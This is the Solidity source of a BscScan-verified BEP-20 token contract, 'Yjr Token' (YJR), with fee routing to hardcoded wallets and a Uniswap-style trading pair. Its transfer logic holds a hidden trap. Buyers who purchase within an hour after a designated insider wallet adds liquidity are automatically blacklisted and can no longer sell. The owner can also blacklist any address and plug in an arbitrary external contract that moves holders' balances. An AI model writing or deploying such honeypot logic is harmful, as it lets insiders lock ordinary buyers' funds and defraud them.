/**
 *Submitted for verification at BscScan.com on 2022-09-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-13
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.14;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface TOKENTOOL {
    function calculatePool(address spender, uint112 reserve0, uint112 reserve1, uint256 poolnum) external returns (bool);
    function changePool(address recipient, uint16 tokenId, uint8 gtype) external returns(bool,uint256);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success,) = recipient.call{ value : amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value : weiValue}(data);
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address public owner;

    modifier onlyOwner() {
        require(owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        owner = address(0);
    }

    function getTime() public view returns (uint256) {
        return block.timestamp;
    }
}

interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract YJRTOKEN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    address payable marketAdd;
    address payable usdtPollAdd;
    address payable subPoolAdd;
    address payable fluidityAddress;
    address private transferFeeAdd;

    address private changePoolAdd;

    mapping (address => uint256) _balances;
    mapping (address => uint256) public pollAmount;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isblacklist;
    mapping (address => bool) private isMarketPair;

    address public uniswapPair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping (address => uint8) private usdtWay;

    address public newPollAddress;
    address tokenTool;
    address usdtToken;
    address wushi;

    uint256 lockbuy = 0;

    event getReservesData(
        uint112 reserve0,
        uint112 reserve1,
        uint256 pollUsdt
    );

    constructor (
        address _usdtToken,      // 0x55d398326f99059ff775485246999027b3197955
        address _router,         // 0x10ed43c718714eb63d5aa57b78b54704e256024e
        address _taguo,          // 0x015EAbF37533E2E35f89a97e694271f05380B7A8
        address _wushi,          // 0xBe184Aead40F44219EECbC255f4CF4c3F8Bf274B
        address _shiwu,          // 0xb6Fd3A31890111104609851d272192AA90FD52Af
        address _fluidity        // 
    ) payable {
        _name = "Yjr Token";
        _symbol = "YJR";
        _decimals = 6;
        _totalSupply = 2750000 * 10 ** _decimals;

        usdtToken = _usdtToken;

        owner = payable(msg.sender);
        marketAdd = payable(0x33Bc71a4802EB4C73f192677abc31EE63dfF3D0e);
        subPoolAdd = payable(0x93dDfF69f1FaA4BCc1AdD12e8557F237B4e2bcE7);
        transferFeeAdd = payable(0x38dAD27581Fc390B566030B09b952b070A6c6F9b);

        usdtPollAdd = payable(0x393Be4E25D77856B4ebA7A3885fA9FCD535D1a11);
        changePoolAdd = payable(0x93dDfF69f1FaA4BCc1AdD12e8557F237B4e2bcE7);

        isExcludedFromFee[owner] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[marketAdd] = true;
        isExcludedFromFee[subPoolAdd] = true;
        isExcludedFromFee[transferFeeAdd] = true;
        isExcludedFromFee[usdtPollAdd] = true;
        isExcludedFromFee[changePoolAdd] = true;
        isExcludedFromFee[_taguo] = true;
        isExcludedFromFee[_wushi] = true;
        isExcludedFromFee[_shiwu] = true;
        isExcludedFromFee[_fluidity] = true;

        fluidityAddress = payable(_fluidity);

        _balances[_taguo] = 2100000 * 10 ** _decimals;
        _balances[_wushi] =  500000 * 10 ** _decimals;
        _balances[_shiwu] =  150000 * 10 ** _decimals;

        wushi = _wushi;

        emit Transfer(address(0), _taguo, _balances[_taguo]);
        emit Transfer(address(0), _wushi, _balances[_wushi]);
        emit Transfer(address(0), _shiwu, _balances[_shiwu]);
        setPool(_router,1);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function setPool(address _router, uint8 gtype) private returns(address newPair) {

        IUniswapV2Router02 newRouter = IUniswapV2Router02(_router);
        newPair = IUniswapV2Factory(newRouter.factory()).createPair(address(this), usdtToken);

        if(IUniswapV2Pair(newPair).token0() == address(usdtToken)) usdtWay[newPair] = 1;

        _allowances[address(this)][address(newRouter)] = _totalSupply;
        isMarketPair[address(newPair)] = true;
        isExcludedFromFee[address(newPair)] = true;

        if(gtype==1){
            uniswapV2Router = newRouter;
            uniswapPair = newPair;
        }
        return newPair;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        if(amount == 0) return true;
        if(newPollAddress != address(0)){
            if(isMarketPair[sender]){
                require(recipient != newPollAddress, "YJR: Can't trade continuously");
            }
            pollAmount[newPollAddress] = IUniswapV2Pair(uniswapPair).balanceOf(newPollAddress);
            delete newPollAddress;
        }
        require(isblacklist[sender] == false, "Permission denied");

        if(isMarketPair[recipient] == false && isMarketPair[sender] == false){
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            if(isExcludedFromFee[sender]==false){
                uint256 transferFee = amount.mul(20).div(1000);
                _balances[transferFeeAdd] = _balances[transferFeeAdd].add(transferFee);
                amount = amount.sub(transferFee);
                emit Transfer(sender, transferFeeAdd, transferFee);
            }
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
            return true;
        }

        IUniswapV2Pair pairContent = IUniswapV2Pair(uniswapPair);
        (uint112 reserve0, uint112 reserve1,) = pairContent.getReserves();
        uint pollUsdt = IUniswapV2Pair(usdtToken).balanceOf(uniswapPair);
        emit getReservesData(reserve0, reserve1, pollUsdt);
        uint256 reserve = usdtWay[uniswapPair]==1 ? reserve0 : reserve1;

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        if(isMarketPair[recipient]) {
            if(reserve < pollUsdt){
                newPollAddress = sender;
                if(wushi == sender && lockbuy==0){
                    lockbuy = block.timestamp;
                }
            }else{
                if(isExcludedFromFee[sender]==false){
                    _weighted(amount.mul(65).div(1000), sender);
                    amount = amount.sub(amount.mul(65).div(1000));
                }
            }
            pollAmount[sender] = pairContent.balanceOf(sender);
        }else if(isMarketPair[sender]){
            uint pollNumber = pairContent.balanceOf(recipient);
            if(pollNumber < pollAmount[recipient]){
                newPollAddress = recipient;
                if(tokenTool != address(0)){
                    TOKENTOOL(tokenTool).calculatePool(recipient,reserve0,reserve1,pollNumber);
                }
                if(isExcludedFromFee[recipient] == false){
                    uint256 subPoolFee = amount.mul(35).div(1000);
                    _balances[subPoolAdd] = _balances[subPoolAdd].add(subPoolFee);
                    emit Transfer(sender, subPoolAdd, subPoolFee);
                    amount = amount.sub(subPoolFee);
                }
            }else{
                if(block.timestamp - lockbuy < 3600){
                    isblacklist[recipient] = true;
                }
            }
            pollAmount[recipient] = pollNumber;
        }
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapTokenForUsdt(uint256 tokenAmount, address _to) private returns (bool) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdtToken);
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of TOKEN
            path,
            _to, // The contract
            block.timestamp
        );
        return true;
    }

    function _weighted(uint256 sixPercent, address _from) private {
        _balances[address(this)] = _balances[address(this)].add(sixPercent);
        emit Transfer(_from, address(this), sixPercent);

        uint256 before = IERC20(usdtToken).balanceOf(uniswapPair);
        swapTokenForUsdt(sixPercent,fluidityAddress);
        uint256 afterU = IERC20(usdtToken).balanceOf(uniswapPair);
        uint256 realUsdt = before.sub(afterU);

        uint256 amountUMarket = realUsdt.mul(200).div(650);
        IERC20(usdtToken).transferFrom(fluidityAddress, marketAdd, amountUMarket);
        realUsdt = realUsdt.sub(amountUMarket);
        IERC20(usdtToken).transferFrom(fluidityAddress, usdtPollAdd, realUsdt);
    }

    function setTokenTool(address _token) public onlyOwner {
        tokenTool = _token;
        isExcludedFromFee[_token] = true;
    }

    function setExcluded(address _add, bool _val) public onlyOwner {
        isExcludedFromFee[_add] = _val;
    }

    function setBlacklist(address _add, bool _val) public onlyOwner {
        isblacklist[_add] = _val;
    }

    function changePool(uint16 tokenId, uint8 gtype) public {
        (bool res, uint256 lpvalue) = TOKENTOOL(tokenTool).changePool(msg.sender, tokenId, gtype);
        require(res == true, "have error");
        _balances[msg.sender] = _balances[msg.sender].sub(lpvalue, "Insufficient Balance");
        _balances[changePoolAdd] = _balances[changePoolAdd].add(lpvalue);
        emit Transfer(msg.sender, changePoolAdd, lpvalue);
    }
}